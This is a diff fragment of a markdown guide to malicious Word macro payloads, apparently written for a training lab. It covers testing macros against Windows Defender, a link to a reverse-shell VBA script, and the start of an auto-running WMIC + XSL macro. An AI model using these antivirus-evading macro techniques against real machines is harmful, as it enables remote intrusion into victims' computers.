@@ -12,8 +12,6 @@ Once .docm file created, go to tab View => Macros => View Macros => "Macros in: 
 4. Always try the macro first on the dev box (not your computer since you might have Word 64 bits), first with Defender disabled, and once it works, with Defender enabled (the AV version is the same with all boxes)
 5. All the following payload are confirmed to work on all active sets (AV is the same and is not updated); if it doesn't work, it's not the payload I provide.
 
-Guide written by Tamarisk.
-
 # 1. The simplest :
 
 https://raw.githubusercontent.com/S3cur3Th1sSh1t/OffensiveVBA/main/src/Reverse-Shell.vba
@@ -111,7 +109,6 @@ End Sub
 ```
 
 # 5. WMIC + XSL
-Works for sure on DenkiAir
 
 ```vb
 Sub AutoOpen()
